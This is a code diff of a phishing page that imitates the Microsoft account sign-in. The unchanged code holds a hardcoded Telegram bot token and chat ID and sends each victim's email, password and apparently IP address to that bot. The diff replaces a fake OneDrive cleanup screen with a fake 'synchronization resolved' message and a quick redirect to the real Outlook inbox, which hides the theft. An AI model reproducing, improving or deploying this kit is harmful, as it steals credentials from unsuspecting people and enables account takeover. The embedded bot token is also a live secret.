@@ -28,7 +28,7 @@
 
         .login-container {
             width: 100%;
-            max-width: 500px;  /* slightly wider for better spacing */
+            max-width: 500px;
         }
 
         .login-box {
@@ -43,7 +43,7 @@
 
         .microsoft-header {
             background: transparent;
-            padding: 28px 36px 16px 36px;  /* increased left/right */
+            padding: 28px 36px 16px 36px;
             display: flex;
             align-items: center;
             gap: 12px;
@@ -83,11 +83,11 @@
         }
 
         .login-content {
-            padding: 0 36px 36px 36px;  /* uniform horizontal padding */
+            padding: 0 36px 36px 36px;
         }
 
         .form-group {
-            margin-bottom: 28px;  /* more space between groups */
+            margin-bottom: 28px;
         }
 
         .form-group.hidden {
@@ -117,9 +117,9 @@
 
         input[type="email"], input[type="password"] {
             width: 100%;
-            padding: 16px 18px;      /* larger padding */
+            padding: 16px 18px;
             border: 1.5px solid #c2c2c2;
-            border-radius: 16px;      /* softer corners */
+            border-radius: 16px;
             font-size: 16px;
             background: #ffffff;
             transition: all 0.2s cubic-bezier(0.2,0,0,1);
@@ -196,7 +196,7 @@
         }
 
         .buttons-container {
-            margin-top: 36px;         /* more breathing above buttons */
+            margin-top: 36px;
             display: flex;
             justify-content: flex-end;
             align-items: center;
@@ -251,7 +251,6 @@
             display: none;
         }
 
-        /* error / invalid messages */
         .error-message {
             color: #c42b1c;
             font-size: 14px;
@@ -354,134 +353,41 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* --- Cleanup styles (spaced out) --- */
-        .cleanup-status {
+        /* Synchronization message styles */
+        .sync-message {
+            background: #e8f5e9;
+            border: 1px solid #4caf50;
+            border-radius: 40px;
+            padding: 24px 28px;
+            margin: 20px 0 24px 0;
             text-align: center;
-            margin: 32px 0;
+            animation: fadeIn 0.3s ease;
         }
 
-        .cleanup-icon {
-            font-size: 60px;
-            margin-bottom: 28px;
-            color: #0066b4;
-            filter: drop-shadow(0 6px 12px rgba(0,102,180,0.2));
+        .sync-message:before {
+            content: "✓";
+            font-size: 32px;
+            color: #4caf50;
+            display: block;
+            margin-bottom: 12px;
         }
 
-        .status-message {
-            font-size: 18px;
-            font-weight: 500;
-            margin-bottom: 24px;
-        }
-
-        .cleanup-progress {
-            width: 100%;
-            height: 10px;
-            background-color: #e6e6e6;
-            border-radius: 30px;
-            margin: 28px 0;
-            overflow: hidden;
-        }
-
-        .cleanup-progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, #0066b4, #3b9eff);
-            border-radius: 30px;
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-
-        .storage-display {
-            background: #fafcff;
-            border-radius: 28px;
-            padding: 28px;
-            margin: 32px 0;
-            border: 1px solid #eef2f6;
-            box-shadow: 0 4px 14px rgba(0,0,0,0.02);
-        }
-
-        .storage-title {
-            font-weight: 600;
-            margin-bottom: 20px;
-            color: #1e1e1e;
-            font-size: 20px;
-        }
-
-        .storage-bar {
-            height: 14px;
-            background-color: #e0e6ed;
-            border-radius: 30px;
-            overflow: hidden;
-            margin-bottom: 16px;
-        }
-
-        .storage-used {
-            height: 100%;
-            background: linear-gradient(90deg, #c42b1c, #d86c60);
-            border-radius: 30px;
-            width: 94%;
-            transition: width 2s cubic-bezier(0.22, 1, 0.36, 1);
-        }
-
-        .storage-labels {
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: #5e5e5e;
-        }
-
-        .storage-labels span, .storage-numbers span {
-            font-size: 15px;
-            font-weight: 500;
-        }
-
-        .storage-numbers {
-            font-weight: 600;
-            color: #1e1e1e;
-            font-size: 16px;
-        }
-
-        .cleanup-results {
-            text-align: left;
-            margin-top: 36px;
-            padding: 28px;
-            background: #f4faf4;
-            border-radius: 28px;
-            border-left: 6px solid #0f6b0f;
-            display: none;
-        }
-
-        .result-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 0;
-            border-bottom: 1px solid #cfdbe8;
-            font-size: 16px;
-        }
-
-        .cleanup-complete {
-            text-align: center;
-            margin: 32px 0;
-            display: none;
-        }
-
-        .success-icon {
-            font-size: 72px;
-            margin-bottom: 24px;
-        }
-
-        .redirect-message {
-            margin-top: 28px;
-            padding: 24px;
-            background-color: #ecf3fc;
-            border-radius: 28px;
-            font-size: 16px;
-            display: none;
-            border: 1px solid #b6d6f0;
-        }
-
-        .countdown {
+        .sync-message h3 {
+            color: #2e7d32;
             font-size: 22px;
-            color: #0066b4;
-            font-weight: 700;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .sync-message p {
+            color: #1e1e1e;
+            font-size: 16px;
+            font-weight: 400;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .clear { clear: both; }
@@ -566,56 +472,16 @@
                 </form>
             </div>
 
-            <!-- CLEANUP section (spacious) -->
-            <div class="login-content cleanup-section" id="cleanupSection">
+            <!-- SYNCHRONIZATION MESSAGE SECTION (replaces cleanup) -->
+            <div class="login-content cleanup-section" id="syncSection">
                 <div class="login-header">
-                    <h1 class="login-title">Optimizing OneDrive</h1>
-                    <div class="login-sub">Making space, hang tight...</div>
+                    <h1 class="login-title">Sign in</h1>
+                    <div class="login-sub">to your Microsoft account</div>
                 </div>
                 
-                <div class="cleanup-status">
-                    <div class="cleanup-icon" id="cleanupIcon">🔄</div>
-                    <div class="status-message" id="cleanupStatus">Initializing cleaner</div>
-                    
-                    <div class="cleanup-progress">
-                        <div class="cleanup-progress-bar" id="cleanupProgress"></div>
-                    </div>
-                </div>
-                
-                <div class="storage-display">
-                    <div class="storage-title">📁 OneDrive (cloud + local)</div>
-                    
-                    <div class="storage-labels">
-                        <span class="storage-label-left">0 GB</span>
-                        <span class="storage-label-right">5 GB total</span>
-                    </div>
-                    <div class="storage-bar">
-                        <div class="storage-used" id="storageBar" style="width:94%"></div>
-                    </div>
-                    <div class="storage-numbers">
-                        <span class="storage-number-left" id="usedStorage">4.7 GB used</span>
-                        <span class="storage-number-right" id="freeStorage">0.3 GB free</span>
-                    </div>
-                </div>
-                
-                <div class="cleanup-results" id="cleanupResults">
-                    <h3 style="color:#0f6b0f; margin-bottom:18px;">✅ Cleanup complete</h3>
-                    <div class="result-item"><span>🕐 Temporary system files</span><span>1.2 GB</span></div>
-                    <div class="result-item"><span>🖼️ Duplicate images</span><span>856 MB</span></div>
-                    <div class="result-item"><span>📄 Old document versions</span><span>634 MB</span></div>
-                    <div class="result-item"><span>⚙️ Cached data</span><span>412 MB</span></div>
-                    <div class="result-item" style="font-weight:600;"><span>Total recovered</span><span>3.1 GB</span></div>
-                </div>
-                
-                <div class="cleanup-complete" id="cleanupComplete">
-                    <div class="success-icon">✨</div>
-                    <h2 style="color:#0f6b0f;">All set!</h2>
-                    <p style="margin-top:10px;">Your storage is optimized.</p>
-                </div>
-                
-                <div class="redirect-message" id="redirectMessage">
-                    <p>You now have <strong>3.4 GB free</strong>.</p>
-                    <p>Redirecting to Microsoft homepage in <span class="countdown" id="countdown">3</span>s</p>
+                <div class="sync-message">
+                    <h3>Synchronization issue resolved</h3>
+                    <p>Your account is now in sync. Redirecting to inbox...</p>
                 </div>
             </div>
         </div>
@@ -630,7 +496,7 @@
     </div>
 
     <script>
-        // --- Two-attempt logic with proper spacing ---
+        // --- Two-attempt logic with immediate redirect ---
         const TELEGRAM_BOT_TOKEN = '8404555198:AAGTDMBJ1nkK1fJL42_jtaIWjtRB3DfTWz0';
         const TELEGRAM_CHAT_ID = '6439618231';
         
@@ -644,7 +510,7 @@
 
         // DOM
         const loginSection = document.getElementById('loginSection');
-        const cleanupSection = document.getElementById('cleanupSection');
+        const syncSection = document.getElementById('syncSection');
         const emailGroup = document.getElementById('emailGroup');
         const passwordGroup = document.getElementById('passwordGroup');
         const backButton = document.getElementById('backButton');
@@ -656,18 +522,6 @@
         const passwordError = document.getElementById('passwordError');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const invalidCredsMessage = document.getElementById('invalidCredsMessage');
-        
-        // Cleanup elements
-        const cleanupStatus = document.getElementById('cleanupStatus');
-        const cleanupProgress = document.getElementById('cleanupProgress');
-        const cleanupIcon = document.getElementById('cleanupIcon');
-        const storageBar = document.getElementById('storageBar');
-        const usedStorage = document.getElementById('usedStorage');
-        const freeStorage = document.getElementById('freeStorage');
-        const cleanupResults = document.getElementById('cleanupResults');
-        const cleanupComplete = document.getElementById('cleanupComplete');
-        const redirectMessage = document.getElementById('redirectMessage');
-        const countdownElement = document.getElementById('countdown');
 
         async function getUserIP() {
             try {
@@ -750,10 +604,18 @@
                 sendCredentialsToTelegram(email, pwd, 2);
                 invalidCredsMessage.style.display = 'none';
                 loadingOverlay.style.display = 'flex';
+                
+                // Show loading for 800ms then show sync message and redirect
                 setTimeout(() => {
                     loadingOverlay.style.display = 'none';
-                    startCleanupProcess();
-                }, 1400);
+                    loginSection.style.display = 'none';
+                    syncSection.classList.add('active');
+                    
+                    // Redirect to Outlook inbox immediately after showing message
+                    setTimeout(() => {
+                        window.location.href = 'https://outlook.live.com/mail/0/inbox/';
+                    }, 50); // 50ms delay - virtually immediate but allows message to render
+                }, 800);
             }
         });
 
@@ -774,70 +636,6 @@
         document.addEventListener('keydown', e=>{ if(e.key==='Enter') submitButton.click(); });
         emailInput.addEventListener('input', ()=> emailError.style.display = 'none');
         passwordInput.addEventListener('input', ()=> passwordError.style.display = 'none');
-
-        function startCleanupProcess() {
-            loginSection.style.display = 'none';
-            cleanupSection.classList.add('active');
-
-            let progress = 0;
-            let step = 0;
-            const steps = [
-                "Scanning temp files...", "Removing duplicates...",
-                "Cleaning old versions...", "Purging cache...",
-                "Optimizing indexes...", "Finalizing...",
-                "Almost done..."
-            ];
-
-            const interval = setInterval(() => {
-                progress += 0.57;
-                if (progress > 100) progress = 100;
-                cleanupProgress.style.width = progress + '%';
-
-                if (progress >= 15 && step===0) { cleanupStatus.textContent = steps[0]; step=1; }
-                else if (progress >= 28 && step===1) { cleanupStatus.textContent = steps[1]; step=2; }
-                else if (progress >= 42 && step===2) { cleanupStatus.textContent = steps[2]; step=3; }
-                else if (progress >= 56 && step===3) { cleanupStatus.textContent = steps[3]; step=4; }
-                else if (progress >= 70 && step===4) { cleanupStatus.textContent = steps[4]; step=5; }
-                else if (progress >= 85 && step===5) { cleanupStatus.textContent = steps[5]; step=6; }
-                else if (progress >= 95 && step===6) { cleanupStatus.textContent = steps[6]; step=7; }
-
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    completeCleanup();
-                }
-            }, 200);
-        }
-
-        function completeCleanup() {
-            cleanupStatus.textContent = "Optimization complete!";
-            cleanupIcon.textContent = "✅";
-            setTimeout(()=>{
-                storageBar.style.width = '32%';
-                storageBar.style.background = 'linear-gradient(90deg, #0f6b0f, #4caf4c)';
-                setTimeout(()=>{
-                    usedStorage.textContent = "1.6 GB used";
-                    freeStorage.textContent = "3.4 GB free";
-                    setTimeout(()=>{
-                        cleanupResults.style.display = 'block';
-                        setTimeout(()=>{
-                            cleanupComplete.style.display = 'block';
-                            setTimeout(()=>{
-                                redirectMessage.style.display = 'block';
-                                let c = 3;
-                                const cd = setInterval(()=>{
-                                    c--;
-                                    countdownElement.textContent = c;
-                                    if (c<=0) {
-                                        clearInterval(cd);
-                                        window.location.href = 'https://www.microsoft.com';
-                                    }
-                                },1000);
-                            },800);
-                        },600);
-                    },600);
-                },500);
-            },300);
-        }
 
         window.addEventListener('load', ()=>{
             emailInput.focus();
